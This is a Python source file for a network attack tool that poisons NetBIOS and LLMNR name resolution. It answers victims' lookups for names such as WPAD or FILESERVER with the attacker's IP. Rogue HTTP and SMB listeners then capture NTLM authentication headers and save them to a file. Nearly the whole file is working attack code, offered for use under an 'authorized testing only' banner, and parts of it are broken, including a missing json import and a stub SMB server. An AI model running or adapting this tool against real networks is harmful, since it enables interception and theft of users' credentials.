#!/usr/bin/env python3
"""
NetBIOS / LLMNR Poisoning Tool
For authorized security testing only
"""
import sys
import socket
import struct
import threading
import time
import random
from collections import defaultdict

class NetBIOSPoisoner:
    def __init__(self, interface='0.0.0.0', responder_ip=None):
        self.interface = interface
        self.responder_ip = responder_ip or self.get_local_ip()
        self.running = False
        
        # NetBIOS Name Service port
        self.nbns_port = 137
        
        # LLMNR multicast address and port
        self.llmnr_mcast = '224.0.0.252'
        self.llmnr_port = 5355
        
        # Statistics
        self.stats = defaultdict(int)
        self.captured_hashes = []
        
        # Common names to spoof
        self.spoof_names = [
            'WPAD', 'ISATAP', 'FILESERVER', 'FILESHARE',
            'PRINT', 'PRINTER', 'SERVER', 'NAS', 'BACKUP'
        ]
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def create_nbns_response(self, query, name):
        """Create NBNS response packet"""
        # Transaction ID
        transaction_id = query[:2]
        
        # Flags: Response, Authoritative, Recursion Desired
        flags = struct.pack('>H', 0x8500)
        
        # Questions
        questions = query[4:6]
        
        # Answer RRs
        answers = struct.pack('>H', 1)
        
        # Authority RRs, Additional RRs
        authority = struct.pack('>H', 0)
        additional = struct.pack('>H', 0)
        
        # Original question
        original_question = query[12:]
        
        # Answer
        name_encoded = self.encode_nbns_name(name)
        answer = name_encoded
        answer += struct.pack('>H', 0x0020)  # Type: NB
        answer += struct.pack('>H', 0x0001)  # Class: IN
        answer += struct.pack('>I', 0)       # TTL
        answer += struct.pack('>H', 6)       # Data length
        answer += struct.pack('>H', 0x0000)  # Flags
        
        # IP address
        ip_parts = [int(x) for x in self.responder_ip.split('.')]
        answer += struct.pack('BBBB', *ip_parts)
        
        # Construct response
        response = transaction_id
        response += flags
        response += questions
        response += answers
        response += authority
        response += additional
        response += original_question
        response += answer
        
        return response
    
    def encode_nbns_name(self, name):
        """Encode name for NetBIOS"""
        encoded = b''
        padded_name = name.ljust(15, ' ')
        
        for char in padded_name:
            encoded += bytes([((ord(char) >> 4) & 0xF) + 0x41])
            encoded += bytes([(ord(char) & 0xF) + 0x41])
        
        # Add NetBIOS suffix
        encoded += b'CA'  # File Server Service
        
        # Add length byte
        return bytes([len(encoded)]) + encoded + b'\x00'
    
    def start_nbns_poisoner(self):
        """Start NBNS poisoning"""
        print(f"[*] Starting NBNS poisoner on {self.responder_ip}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.interface, self.nbns_port))
        
        while self.running:
            try:
                data, addr = sock.recvfrom(1024)
                
                if len(data) < 12:
                    continue
                
                # Parse query
                query_name = self.parse_nbns_query(data)
                
                if query_name:
                    # Check if we should spoof this name
                    for spoof_name in self.spoof_names:
                        if spoof_name.lower() in query_name.lower():
                            print(f"[+] NBNS Query: {query_name} from {addr[0]}")
                            self.stats['nbns_poisoned'] += 1
                            
                            # Send response
                            response = self.create_nbns_response(data, spoof_name)
                            sock.sendto(response, addr)
                            break
            
            except Exception as e:
                if self.running:
                    print(f"[-] NBNS error: {e}")
        
        sock.close()
    
    def parse_nbns_query(self, data):
        """Parse NBNS query"""
        try:
            # Skip header (12 bytes)
            query_start = 12
            
            # Read name
            name = ''
            while query_start < len(data):
                length = data[query_start]
                if length == 0:
                    break
                
                query_start += 1
                name += data[query_start:query_start + length].decode('ascii', errors='ignore')
                query_start += length
            
            return name.strip()
        except:
            return None
    
    def start_llmnr_poisoner(self):
        """Start LLMNR poisoning"""
        print(f"[*] Starting LLMNR poisoner on {self.responder_ip}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Join multicast group
        mreq = struct.pack('4sL', socket.inet_aton(self.llmnr_mcast), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        
        sock.bind((self.interface, self.llmnr_port))
        
        while self.running:
            try:
                data, addr = sock.recvfrom(1024)
                
                # Parse LLMNR query
                query_name = self.parse_llmnr_query(data)
                
                if query_name:
                    print(f"[+] LLMNR Query: {query_name} from {addr[0]}")
                    self.stats['llmnr_poisoned'] += 1
                    
                    # Create and send response
                    response = self.create_llmnr_response(data, query_name)
                    if response:
                        sock.sendto(response, addr)
            
            except Exception as e:
                if self.running:
                    print(f"[-] LLMNR error: {e}")
        
        sock.close()
    
    def parse_llmnr_query(self, data):
        """Parse LLMNR query"""
        try:
            # LLMNR queries are DNS-like
            if len(data) < 12:
                return None
            
            transaction_id = data[:2]
            flags = struct.unpack('>H', data[2:4])[0]
            questions = struct.unpack('>H', data[4:6])[0]
            
            if questions == 0:
                return None
            
            # Parse question
            pos = 12
            name_parts = []
            
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                
                if length > 63:  # Pointer
                    pos += 2
                    break
                
                pos += 1
                name_parts.append(data[pos:pos+length].decode('ascii', errors='ignore'))
                pos += length
            
            return '.'.join(name_parts)
        except:
            return None
    
    def create_llmnr_response(self, query, name):
        """Create LLMNR response"""
        try:
            transaction_id = query[:2]
            
            # Flags: Response, No Error
            flags = struct.pack('>H', 0x8000)
            
            # Questions
            questions = struct.pack('>H', 1)
            
            # Answer RRs
            answers = struct.pack('>H', 1)
            
            # Authority, Additional
            authority = struct.pack('>H', 0)
            additional = struct.pack('>H', 0)
            
            # Encode name
            name_encoded = b''
            for part in name.split('.'):
                name_encoded += bytes([len(part)])
                name_encoded += part.encode()
            name_encoded += b'\x00'
            
            # Type A, Class IN
            name_encoded += struct.pack('>H', 1)  # Type A
            name_encoded += struct.pack('>H', 1)  # Class IN
            
            # Answer
            answer = name_encoded
            answer += struct.pack('>I', 30)  # TTL
            answer += struct.pack('>H', 4)   # Data length
            answer += socket.inet_aton(self.responder_ip)
            
            # Construct response
            response = transaction_id
            response += flags
            response += questions
            response += answers
            response += authority
            response += additional
            response += name_encoded
            response += answer
            
            return response
            
        except Exception as e:
            print(f"[-] Response creation error: {e}")
            return None
    
    def start_http_server(self):
        """Start HTTP server for capturing hashes"""
        import http.server
        
        class HashCaptureHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                # Capture NTLM authentication
                auth_header = self.headers.get('Authorization', '')
                
                if 'NTLM' in auth_header:
                    print(f"[!] Captured NTLM hash from {self.client_address[0]}")
                    
                    # Send 401 to continue handshake
                    self.send_response(401)
                    self.send_header('WWW-Authenticate', 'NTLM')
                    self.send_header('Content-Length', '0')
                    self.end_headers()
                    
                    self.server.poisoner.captured_hashes.append({
                        'ip': self.client_address[0],
                        'type': 'NTLM',
                        'hash': auth_header,
                        'timestamp': time.time()
                    })
                else:
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
            
            def log_message(self, format, *args):
                pass  # Suppress logs
        
        server = http.server.HTTPServer((self.interface, 80), HashCaptureHandler)
        server.poisoner = self
        
        print(f"[*] HTTP capture server on {self.interface}:80")
        
        while self.running:
            server.handle_request()
    
    def start_smb_server(self):
        """Start SMB server for capturing hashes"""
        # Simplified SMB server for hash capture
        print(f"[*] SMB capture server on {self.interface}:445")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.interface, 445))
        sock.listen(5)
        
        while self.running:
            try:
                client, addr = sock.accept()
                print(f"[+] SMB connection from {addr[0]}")
                
                # Send SMB negotiate response
                smb_header = bytes([
                    0x00, 0x00, 0x00, 0x54,  # NetBIOS
                    0xFF, 0x53, 0x4D, 0x42,  # SMB
                    0x72, 0x00, 0x00, 0x00,  # Negotiate
                    0x00, 0x98, 0x01, 0x20,  # Flags
                    # ... rest of header
                ])
                
                client.send(smb_header)
                time.sleep(0.1)
                client.close()
                
                self.stats['smb_connections'] += 1
                
            except:
                pass
        
        sock.close()
    
    def start(self):
        """Start all poisoning services"""
        print(f"[*] Starting NetBIOS/LLMNR Poisoner")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Responder IP: {self.responder_ip}")
        
        self.running = True
        
        # Start NBNS poisoner
        nbns_thread = threading.Thread(target=self.start_nbns_poisoner)
        nbns_thread.daemon = True
        nbns_thread.start()
        
        # Start LLMNR poisoner
        llmnr_thread = threading.Thread(target=self.start_llmnr_poisoner)
        llmnr_thread.daemon = True
        llmnr_thread.start()
        
        # Start HTTP server
        http_thread = threading.Thread(target=self.start_http_server)
        http_thread.daemon = True
        http_thread.start()
        
        # Start SMB server
        smb_thread = threading.Thread(target=self.start_smb_server)
        smb_thread.daemon = True
        smb_thread.start()
        
        print("\n[*] Poisoning active! Press Ctrl+C to stop")
        print(f"[*] NBNS: {self.nbns_port}, LLMNR: {self.llmnr_port}")
        print(f"[*] HTTP: 80, SMB: 445")
        
        try:
            while True:
                time.sleep(10)
                print(f"\n[*] Stats - NBNS: {self.stats['nbns_poisoned']}, "
                      f"LLMNR: {self.stats['llmnr_poisoned']}, "
                      f"Hasht: {len(self.captured_hashes)}")
        
        except KeyboardInterrupt:
            print("\n[*] Stopping poisoner...")
            self.running = False
            
            # Save captured hashes
            if self.captured_hashes:
                with open('captured_hashes.json', 'w') as f:
                    json.dump(self.captured_hashes, f, indent=2)
                print(f"[+] {len(self.captured_hashes)} hashes saved to captured_hashes.json")

def main():
    if len(sys.argv) < 2:
        print("Usage: python netbios_poisoner.py <interface_ip>")
        print("Example: python netbios_poisoner.py 192.168.1.100")
        print("\nNote: Requires root/admin privileges")
        sys.exit(1)
    
    interface = sys.argv[1]
    
    print("[!] WARNING: Only use for authorized security testing!")
    
    poisoner = NetBIOSPoisoner(interface=interface)
    poisoner.start()

if __name__ == "__main__":
    main()
